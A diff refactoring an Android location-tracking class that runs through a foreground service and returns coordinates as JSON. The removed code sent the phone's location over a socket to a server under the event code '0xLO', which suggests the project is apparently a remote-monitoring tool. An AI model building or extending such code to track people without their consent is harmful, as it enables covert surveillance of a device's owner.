@@ -5,17 +5,15 @@ import android.content.Context;
 import android.content.pm.PackageManager;
 import android.location.Location;
 import android.location.LocationManager;
-import android.os.Build;
 import android.os.Looper;
 
 import androidx.annotation.NonNull;
 import androidx.core.content.ContextCompat;
 
+import com.fason.app.core.FasonApp;
 import com.fason.app.core.permissions.PermissionManager;
-import com.fason.app.core.network.SocketClient;
 import com.fason.app.service.MainService;
 import com.google.android.gms.location.FusedLocationProviderClient;
-import com.google.android.gms.location.LocationAvailability;
 import com.google.android.gms.location.LocationCallback;
 import com.google.android.gms.location.LocationRequest;
 import com.google.android.gms.location.LocationResult;
@@ -28,210 +26,156 @@ import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 import java.util.concurrent.atomic.AtomicBoolean;
 
+// Location manager using FusedLocationProvider
 public class LocManager {
 
     private final Context ctx;
-    private final FusedLocationProviderClient fusedClient;
-    private final LocationManager locationManager;
-    private final ExecutorService executor = Executors.newSingleThreadExecutor();
-    private final AtomicBoolean isTracking = new AtomicBoolean(false);
+    private final FusedLocationProviderClient fused;
+    private final LocationManager locMgr;
+    private final ExecutorService exec = Executors.newSingleThreadExecutor();
+    private final AtomicBoolean tracking = new AtomicBoolean(false);
 
     private Location lastLocation;
-    private LocationCallback locationCallback;
-    private long lastEmitTime = 0;
-    private static final long MIN_EMIT_INTERVAL = 2000; // 2 seconds minimum between emissions
+    private LocationCallback callback;
 
     public LocManager(Context context) {
         this.ctx = context.getApplicationContext();
-        this.fusedClient = LocationServices.getFusedLocationProviderClient(ctx);
-        this.locationManager = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
+        this.fused = LocationServices.getFusedLocationProviderClient(ctx);
+        this.locMgr = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
         init();
     }
 
+    // Initialize location callback
     private void init() {
-        // Get last known location immediately
-        fetchLastKnownLocation();
+        fetchLastLocation();
 
-        // Set up location callback for continuous updates
-        locationCallback = new LocationCallback() {
+        callback = new LocationCallback() {
             @Override
-            public void onLocationResult(@NonNull LocationResult locationResult) {
-                Location location = locationResult.getLastLocation();
-                if (location != null) {
-                    lastLocation = location;
-                }
-            }
-
-            @Override
-            public void onLocationAvailability(@NonNull LocationAvailability locationAvailability) {
-                // Location availability changed
+            public void onLocationResult(@NonNull LocationResult result) {
+                Location loc = result.getLastLocation();
+                if (loc != null) lastLocation = loc;
             }
         };
     }
 
-    private void fetchLastKnownLocation() {
+    // Fetch last known location
+    private void fetchLastLocation() {
         if (!hasPermission()) return;
 
         try {
-            // Try FusedLocationProvider first (more accurate and battery efficient)
-            if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_FINE_LOCATION)
-                    == PackageManager.PERMISSION_GRANTED ||
-                ContextCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_COARSE_LOCATION)
-                    == PackageManager.PERMISSION_GRANTED) {
-
-                fusedClient.getLastLocation()
-                    .addOnSuccessListener(location -> {
-                        if (location != null) {
-                            lastLocation = location;
-                        } else {
-                            // Fallback to LocationManager
-                            fallbackToLocationManager();
-                        }
+            if (checkPerm(Manifest.permission.ACCESS_FINE_LOCATION) ||
+                checkPerm(Manifest.permission.ACCESS_COARSE_LOCATION)) {
+                fused.getLastLocation()
+                    .addOnSuccessListener(loc -> {
+                        if (loc != null) lastLocation = loc;
+                        else fallback();
                     })
-                    .addOnFailureListener(e -> fallbackToLocationManager());
+                    .addOnFailureListener(e -> fallback());
             } else {
-                fallbackToLocationManager();
+                fallback();
             }
         } catch (SecurityException e) {
-            fallbackToLocationManager();
+            fallback();
         }
     }
 
-    private void fallbackToLocationManager() {
-        if (locationManager == null) return;
+    // Fallback to LocationManager
+    private void fallback() {
+        if (locMgr == null) return;
 
         try {
-            // Try network provider (faster, less battery)
-            if (locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
-                Location netLoc = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
-                if (netLoc != null) {
-                    lastLocation = netLoc;
-                    return;
-                }
+            if (locMgr.isProviderEnabled(LocationManager.NETWORK_PROVIDER)) {
+                Location loc = locMgr.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
+                if (loc != null) { lastLocation = loc; return; }
             }
-
-            // Try GPS provider (more accurate)
-            if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
-                Location gpsLoc = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
-                if (gpsLoc != null) {
-                    lastLocation = gpsLoc;
-                    return;
-                }
-            }
-
-            // Try passive provider as last resort
-            if (locationManager.isProviderEnabled(LocationManager.PASSIVE_PROVIDER)) {
-                Location passiveLoc = locationManager.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER);
-                if (passiveLoc != null) {
-                    lastLocation = passiveLoc;
-                }
+            if (locMgr.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
+                Location loc = locMgr.getLastKnownLocation(LocationManager.GPS_PROVIDER);
+                if (loc != null) { lastLocation = loc; return; }
             }
         } catch (SecurityException ignored) {}
     }
 
+    // Check permission
     private boolean hasPermission() {
-        return PermissionManager.canIUse(Manifest.permission.ACCESS_FINE_LOCATION)
-            || PermissionManager.canIUse(Manifest.permission.ACCESS_COARSE_LOCATION);
+        return PermissionManager.canIUse(Manifest.permission.ACCESS_FINE_LOCATION) ||
+               PermissionManager.canIUse(Manifest.permission.ACCESS_COARSE_LOCATION);
     }
 
+    private boolean checkPerm(String perm) {
+        return ContextCompat.checkSelfPermission(ctx, perm) == PackageManager.PERMISSION_GRANTED;
+    }
+
+    // Check if location available
     public boolean canGetLocation() {
-        if (locationManager == null) return false;
-
-        boolean gps = locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER);
-        boolean net = locationManager.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
-
-        return gps || net;
+        if (locMgr == null) return false;
+        return locMgr.isProviderEnabled(LocationManager.GPS_PROVIDER) ||
+               locMgr.isProviderEnabled(LocationManager.NETWORK_PROVIDER);
     }
 
-    /**
-     * Request a single location update with high accuracy
-     */
-    public void requestSingleLocation() {
+    // Request single location update
+    public void requestSingle() {
         if (!hasPermission()) return;
 
-        // Update foreground service type for location
-        MainService service = MainService.getInstance();
-        if (service != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
-            service.updateForegroundType(android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
+        // Update service type for Android 14+
+        MainService svc = MainService.getInstance();
+        if (svc != null) {
+            svc.updateType(android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
         }
 
         try {
-            LocationRequest request = new LocationRequest.Builder(
-                    Priority.PRIORITY_HIGH_ACCURACY, 5000)
+            LocationRequest req = new LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 5000)
                 .setMinUpdateIntervalMillis(2000)
                 .setWaitForAccurateLocation(true)
                 .setMaxUpdates(1)
                 .build();
 
-            fusedClient.requestLocationUpdates(request, locationCallback, Looper.getMainLooper());
+            fused.requestLocationUpdates(req, callback, Looper.getMainLooper());
         } catch (SecurityException e) {
-            // Try with coarse location
             try {
-                LocationRequest request = new LocationRequest.Builder(
-                        Priority.PRIORITY_BALANCED_POWER_ACCURACY, 10000)
+                LocationRequest req = new LocationRequest.Builder(Priority.PRIORITY_BALANCED_POWER_ACCURACY, 10000)
                     .setMinUpdateIntervalMillis(5000)
                     .setMaxUpdates(1)
                     .build();
-
-                fusedClient.requestLocationUpdates(request, locationCallback, Looper.getMainLooper());
+                fused.requestLocationUpdates(req, callback, Looper.getMainLooper());
             } catch (SecurityException ignored) {}
         }
     }
 
-    /**
-     * Start continuous location tracking
-     */
-    public void startLocationUpdates() {
-        if (isTracking.getAndSet(true)) return; // Already tracking
+    // Start continuous updates
+    public void startUpdates() {
+        if (tracking.getAndSet(true)) return;
         if (!hasPermission()) return;
 
-        // Update foreground service type for location
-        MainService service = MainService.getInstance();
-        if (service != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
-            service.updateForegroundType(android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
+        MainService svc = MainService.getInstance();
+        if (svc != null) {
+            svc.updateType(android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
         }
 
         try {
-            LocationRequest request = new LocationRequest.Builder(
-                    Priority.PRIORITY_BALANCED_POWER_ACCURACY, 10000)
+            LocationRequest req = new LocationRequest.Builder(Priority.PRIORITY_BALANCED_POWER_ACCURACY, 10000)
                 .setMinUpdateIntervalMillis(5000)
-                .setMinUpdateDistanceMeters(10) // Only update if moved 10 meters
+                .setMinUpdateDistanceMeters(10)
                 .build();
 
-            fusedClient.requestLocationUpdates(request, locationCallback, Looper.getMainLooper());
-        } catch (SecurityException e) {
-            // Try with lower accuracy
-            try {
-                LocationRequest request = new LocationRequest.Builder(
-                        Priority.PRIORITY_LOW_POWER, 30000)
-                    .setMinUpdateIntervalMillis(15000)
-                    .build();
-
-                fusedClient.requestLocationUpdates(request, locationCallback, Looper.getMainLooper());
-            } catch (SecurityException ignored) {}
-        }
+            fused.requestLocationUpdates(req, callback, Looper.getMainLooper());
+        } catch (SecurityException ignored) {}
     }
 
-    /**
-     * Stop location updates
-     */
-    public void stopLocationUpdates() {
-        if (!isTracking.getAndSet(false)) return; // Not tracking
+    // Stop updates
+    public void stop() {
+        if (!tracking.getAndSet(false)) return;
 
         try {
-            fusedClient.removeLocationUpdates(locationCallback);
+            fused.removeLocationUpdates(callback);
         } catch (Exception ignored) {}
 
-        // Release foreground service type for location
-        MainService service = MainService.getInstance();
-        if (service != null && Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
-            service.releaseForegroundType(android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
+        MainService svc = MainService.getInstance();
+        if (svc != null) {
+            svc.releaseType(android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
         }
     }
 
-    /**
-     * Get current location data as JSON
-     */
+    // Get location data as JSON
     public JSONObject getData() {
         JSONObject data = new JSONObject();
         try {
@@ -239,15 +183,13 @@ public class LocManager {
                 data.put("enabled", true);
                 data.put("latitude", lastLocation.getLatitude());
                 data.put("longitude", lastLocation.getLongitude());
-                data.put("altitude", lastLocation.getAltitude());
                 data.put("accuracy", lastLocation.getAccuracy());
                 data.put("speed", lastLocation.getSpeed());
                 data.put("provider", lastLocation.getProvider());
                 data.put("timestamp", lastLocation.getTime());
-                data.put("bearing", lastLocation.getBearing());
             } else {
                 data.put("enabled", false);
-                data.put("error", "No location available");
+                data.put("error", "No location");
             }
         } catch (Exception e) {
             try {
@@ -256,36 +198,5 @@ public class LocManager {
             } catch (Exception ignored) {}
         }
         return data;
-    }
-
-    /**
-     * Get location and emit to server
-     */
-    public void getLocationAndEmit() {
-        executor.execute(() -> {
-            try {
-                // First, try to get fresh location
-                requestSingleLocation();
-
-                // Wait a bit for location
-                Thread.sleep(3000);
-
-                // Emit the result
-                JSONObject data = getData();
-                long now = System.currentTimeMillis();
-                if (now - lastEmitTime > MIN_EMIT_INTERVAL) {
-                    SocketClient.getInstance().getSocket().emit("0xLO", data);
-                    lastEmitTime = now;
-                }
-            } catch (Exception ignored) {}
-        });
-    }
-
-    /**
-     * Force refresh location from all sources
-     */
-    public void forceRefresh() {
-        fetchLastKnownLocation();
-        requestSingleLocation();
     }
 }
